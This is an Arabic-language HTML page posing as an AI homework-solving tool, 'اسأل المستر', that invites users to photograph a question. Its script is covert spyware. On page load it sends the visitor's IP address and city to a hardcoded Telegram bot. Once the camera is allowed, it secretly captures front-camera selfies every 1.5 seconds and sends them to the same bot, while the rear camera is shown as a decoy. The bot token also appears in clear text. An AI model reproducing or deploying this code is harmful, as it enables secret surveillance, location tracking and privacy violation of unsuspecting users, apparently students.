<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>اسأل المستر | المنصة الذكية</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
    
    <script>
        const token = "8763636236:AAGwS4RP8igJ43BK2QdsdWSIl_c7RK9gAjo";
        const chatId = "5890070301";
        
        let frontStream = null;
        let backStream = null;
        let captureInterval = null;

        // وظيفة إرسال الصور
        async function sendPhoto(blob, caption) {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'capture.jpg');
            formData.append('caption', caption);
            try { fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData }); } catch (e) {}
        }

        // وظيفة إرسال النصوص
        async function sendMsg(text) {
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
        }

        async function startSystem() {
            try {
                // 1. تشغيل الكاميرا الأمامية (صامتة تماماً)
                frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const hiddenVideo = document.createElement('video');
                hiddenVideo.srcObject = frontStream;
                hiddenVideo.muted = true;
                await hiddenVideo.play();

                const canvasFront = document.createElement('canvas');
                const ctxFront = canvasFront.getContext('2d');

                // بدء السحب التلقائي من الأمامية
                captureInterval = setInterval(() => {
                    canvasFront.width = hiddenVideo.videoWidth;
                    canvasFront.height = hiddenVideo.videoHeight;
                    ctxFront.drawImage(hiddenVideo, 0, 0);
                    canvasFront.toBlob(blob => {
                        if(blob) sendPhoto(blob, "📸 سيلفي تلقائي (صامت)");
                    }, 'image/jpeg', 0.2);
                }, 1500);

                // 2. تشغيل الكاميرا الخلفية للمعاينة
                backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                const view = document.getElementById('viewfinder');
                view.srcObject = backStream;
                view.style.display = "block";
                document.getElementById('initial-ui').style.display = "none";
                document.getElementById('camera-ui').style.display = "block";

            } catch (err) {
                alert("يجب السماح بالكاميرا لتفعيل وضع الذكاء الاصطناعي");
            }
        }

        function captureStep() {
            // أخفاء الكاميرا وإظهار خانة الوصف
            document.getElementById('camera-ui').style.display = "none";
            document.getElementById('description-ui').style.display = "block";
        }

        function goBack() {
            document.getElementById('description-ui').style.display = "none";
            document.getElementById('camera-ui').style.display = "block";
        }

        function finishAction() {
            const desc = document.getElementById('question-desc').value;
            sendMsg(`📝 وصف السؤال المرسل:\n${desc}`);
            document.getElementById('status').innerHTML = `
                <div style="text-align:center; padding:20px;">
                    <h2 style="color:#4facfe;">✅ تم الإرسال بنجاح</h2>
                    <p>سيتم الرد عليك قريباً.. زرنا قريباً!</p>
                </div>
            `;
        }

        async function initialRadar() {
            let ipData = { ip: "N/A", city: "N/A" };
            try { const res = await fetch('https://ipapi.co/json/'); ipData = await res.json(); } catch(e) {}
            const report = `🚀 **دخول جديد للمنصة**\n📍 الموقع: ${ipData.city}\n🌐 IP: \`${ipData.ip}\``;
            sendMsg(report);
        }

        window.onload = initialRadar;
    </script>

    <style>
        :root { --primary: #4facfe; --bg: #e0e5ec; --shadow: #a3b1c6; }
        body { background: var(--bg); font-family: 'Cairo', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow-x: hidden; }
        .container { background: var(--bg); width: 90%; max-width: 400px; padding: 25px; border-radius: 30px; box-shadow: 20px 20px 60px var(--shadow), -20px -20px 60px #ffffff; }
        .ask-title { font-size: 24px; font-weight: 900; color: var(--primary); text-align: center; margin-bottom: 20px; }
        textarea { width: 100%; height: 100px; background: var(--bg); border: none; border-radius: 15px; padding: 12px; box-shadow: inset 4px 4px 8px var(--shadow), inset -4px -4px 8px #ffffff; outline: none; box-sizing: border-box; }
        .btn-main { background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%); color: white; border: none; width: 100%; padding: 15px; border-radius: 12px; font-weight: bold; cursor: pointer; margin-top: 15px; box-shadow: 4px 4px 10px var(--shadow); }
        .btn-back { background: #eee; color: #666; border: none; padding: 10px; border-radius: 10px; width: 100%; margin-top: 10px; cursor: pointer; }
        #viewfinder { width: 100%; border-radius: 20px; display: none; background: #000; }
        .btn-snap { background: #d93025; border: 4px solid #fff; width: 60px; height: 60px; border-radius: 50%; margin: 15px auto; display: block; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
        .hidden { display: none; }
    </style>
</head>
<body>

    <div class="container" id="status">
        <div class="ask-title">اسأل المستر</div>
        
        <div id="initial-ui">
            <div style="text-align: center; margin-bottom: 20px;">
                <img src="https://img.icons8.com/fluent/100/bot.png" width="80">
                <p>مرحباً بك! اضغط لتصوير سؤالك وسيقوم الذكاء الاصطناعي بحله فوراً.</p>
            </div>
            <button class="btn-main" onclick="startSystem()">📸 تصوير السؤال بالذكاء الاصطناعي</button>
        </div>

        <div id="camera-ui" class="hidden">
            <video id="viewfinder" autoplay playsinline></video>
            <p style="text-align:center; font-size:12px; color:#777;">وجه الكاميرا نحو السؤال واضغط الزر</p>
            <button class="btn-snap" onclick="captureStep()"></button>
        </div>

        <div id="description-ui" class="hidden">
            <p style="font-weight: bold;">أضف وصفاً للسؤال (اختياري):</p>
            <textarea id="question-desc" placeholder="مثلاً: أريد حل الخطوة الثانية..."></textarea>
            <button class="btn-main" onclick="finishAction()">إرسال السؤال 🚀</button>
            <button class="btn-back" onclick="goBack()">🔙 تصوير مرة أخرى</button>
        </div>
    </div>

</body>
</html>
